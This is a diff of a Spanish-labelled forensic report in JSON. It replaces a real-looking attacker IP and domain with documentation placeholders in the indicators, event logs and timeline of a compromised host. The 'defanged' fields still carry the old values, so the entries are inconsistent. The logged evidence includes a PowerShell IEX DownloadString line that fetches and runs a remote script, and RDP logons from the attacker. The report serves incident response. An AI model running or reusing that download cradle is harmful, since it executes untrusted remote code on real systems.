@@ -146,7 +146,7 @@
   "iocs": [
     {
       "type": "ipv4",
-      "value": "91.219.236.14",
+      "value": "203.0.113.14",
       "defanged": "91[.]219[.]236[.]14",
       "count": 12,
       "private": false,
@@ -156,7 +156,7 @@
     },
     {
       "type": "domain",
-      "value": "secure-docs-finance.top",
+      "value": "secure-docs-finance.example",
       "defanged": "secure-docs-finance[.]top",
       "count": 1,
       "private": false,
@@ -176,7 +176,7 @@
     },
     {
       "type": "url",
-      "value": "http://91.219.236.14/a.ps1",
+      "value": "http://203.0.113.14/a.ps1",
       "defanged": "hxxp://91[.]219[.]236[.]14/a[.]ps1",
       "count": 1,
       "private": false,
@@ -186,7 +186,7 @@
     },
     {
       "type": "url",
-      "value": "http://secure-docs-finance.top/invoice.exe",
+      "value": "http://secure-docs-finance.example/invoice.exe",
       "defanged": "hxxp://secure-docs-finance[.]top/invoice[.]exe",
       "count": 1,
       "private": false,
@@ -282,7 +282,7 @@
         "details": {
           "TargetUserName": "administrador",
           "LogonType": "10",
-          "IpAddress": "91.219.236.14"
+          "IpAddress": "203.0.113.14"
         },
         "log_file": "Security.evtx"
       },
@@ -295,7 +295,7 @@
         "details": {
           "TargetUserName": "administrador",
           "LogonType": "10",
-          "IpAddress": "91.219.236.14"
+          "IpAddress": "203.0.113.14"
         },
         "log_file": "Security.evtx"
       },
@@ -308,7 +308,7 @@
         "details": {
           "TargetUserName": "administrador",
           "LogonType": "10",
-          "IpAddress": "91.219.236.14"
+          "IpAddress": "203.0.113.14"
         },
         "log_file": "Security.evtx"
       },
@@ -321,7 +321,7 @@
         "details": {
           "TargetUserName": "administrador",
           "LogonType": "10",
-          "IpAddress": "91.219.236.14"
+          "IpAddress": "203.0.113.14"
         },
         "log_file": "Security.evtx"
       },
@@ -334,7 +334,7 @@
         "details": {
           "TargetUserName": "administrador",
           "LogonType": "10",
-          "IpAddress": "91.219.236.14"
+          "IpAddress": "203.0.113.14"
         },
         "log_file": "Security.evtx"
       },
@@ -347,7 +347,7 @@
         "details": {
           "TargetUserName": "administrador",
           "LogonType": "10",
-          "IpAddress": "91.219.236.14"
+          "IpAddress": "203.0.113.14"
         },
         "log_file": "Security.evtx"
       },
@@ -360,7 +360,7 @@
         "details": {
           "TargetUserName": "administrador",
           "LogonType": "10",
-          "IpAddress": "91.219.236.14"
+          "IpAddress": "203.0.113.14"
         },
         "log_file": "Security.evtx"
       },
@@ -373,7 +373,7 @@
         "details": {
           "TargetUserName": "administrador",
           "LogonType": "10",
-          "IpAddress": "91.219.236.14"
+          "IpAddress": "203.0.113.14"
         },
         "log_file": "Security.evtx"
       },
@@ -386,7 +386,7 @@
         "details": {
           "TargetUserName": "administrador",
           "LogonType": "10",
-          "IpAddress": "91.219.236.14"
+          "IpAddress": "203.0.113.14"
         },
         "log_file": "Security.evtx"
       },
@@ -399,7 +399,7 @@
         "details": {
           "TargetUserName": "administrador",
           "LogonType": "10",
-          "IpAddress": "91.219.236.14"
+          "IpAddress": "203.0.113.14"
         },
         "log_file": "Security.evtx"
       },
@@ -410,7 +410,7 @@
         "channel": "PowerShell",
         "computer": "CORP-FIN-07",
         "details": {
-          "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://91.219.236.14/a.ps1')"
+          "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.14/a.ps1')"
         },
         "log_file": "PowerShell.evtx"
       },
@@ -458,7 +458,7 @@
         "computer": "CORP-FIN-07",
         "details": {
           "Image": "C:\\ProgramData\\svchost.exe",
-          "DestinationIp": "91.219.236.14",
+          "DestinationIp": "203.0.113.14",
           "DestinationPort": "443"
         },
         "log_file": "Sysmon.evtx"
@@ -518,7 +518,7 @@
       {
         "timestamp": "2026-07-14T01:55:00Z",
         "kind": "descarga",
-        "url": "http://secure-docs-finance.top/invoice.exe",
+        "url": "http://secure-docs-finance.example/invoice.exe",
         "title": "invoice.exe",
         "source": "jgarcia_Default_History"
       }
@@ -548,7 +548,7 @@
       "source": "Evento",
       "type": "EID 3",
       "summary": "Sysmon: conexión de red",
-      "detail": "Image=C:\\ProgramData\\svchost.exe · DestinationIp=91.219.236.14 · DestinationPort=443",
+      "detail": "Image=C:\\ProgramData\\svchost.exe · DestinationIp=203.0.113.14 · DestinationPort=443",
       "severity": "info"
     },
     {
@@ -604,7 +604,7 @@
       "source": "Evento",
       "type": "EID 4104",
       "summary": "PowerShell: bloque de script ejecutado",
-      "detail": "ScriptBlockText=IEX (New-Object Net.WebClient).DownloadString('http://91.219.236.14/a.ps1')",
+      "detail": "ScriptBlockText=IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.14/a.ps1')",
       "severity": "warn"
     },
     {
@@ -612,7 +612,7 @@
       "source": "Evento",
       "type": "EID 4624",
       "summary": "Inicio de sesión correcto",
-      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=203.0.113.14",
       "severity": "info"
     },
     {
@@ -620,7 +620,7 @@
       "source": "Evento",
       "type": "EID 4625",
       "summary": "Inicio de sesión fallido",
-      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=203.0.113.14",
       "severity": "warn"
     },
     {
@@ -628,7 +628,7 @@
       "source": "Evento",
       "type": "EID 4625",
       "summary": "Inicio de sesión fallido",
-      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=203.0.113.14",
       "severity": "warn"
     },
     {
@@ -636,7 +636,7 @@
       "source": "Evento",
       "type": "EID 4625",
       "summary": "Inicio de sesión fallido",
-      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=203.0.113.14",
       "severity": "warn"
     },
     {
@@ -644,7 +644,7 @@
       "source": "Evento",
       "type": "EID 4625",
       "summary": "Inicio de sesión fallido",
-      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=203.0.113.14",
       "severity": "warn"
     },
     {
@@ -652,7 +652,7 @@
       "source": "Evento",
       "type": "EID 4625",
       "summary": "Inicio de sesión fallido",
-      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=203.0.113.14",
       "severity": "warn"
     },
     {
@@ -660,7 +660,7 @@
       "source": "Evento",
       "type": "EID 4625",
       "summary": "Inicio de sesión fallido",
-      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=203.0.113.14",
       "severity": "warn"
     },
     {
@@ -668,7 +668,7 @@
       "source": "Evento",
       "type": "EID 4625",
       "summary": "Inicio de sesión fallido",
-      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=203.0.113.14",
       "severity": "warn"
     },
     {
@@ -676,7 +676,7 @@
       "source": "Evento",
       "type": "EID 4625",
       "summary": "Inicio de sesión fallido",
-      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=203.0.113.14",
       "severity": "warn"
     },
     {
@@ -684,14 +684,14 @@
       "source": "Evento",
       "type": "EID 4625",
       "summary": "Inicio de sesión fallido",
-      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=91.219.236.14",
+      "detail": "TargetUserName=administrador · LogonType=10 · IpAddress=203.0.113.14",
       "severity": "warn"
     },
     {
       "timestamp": "2026-07-14T01:55:00Z",
       "source": "Navegador",
       "type": "descarga",
-      "summary": "http://secure-docs-finance.top/invoice.exe",
+      "summary": "http://secure-docs-finance.example/invoice.exe",
       "detail": "invoice.exe",
       "severity": "info"
     }
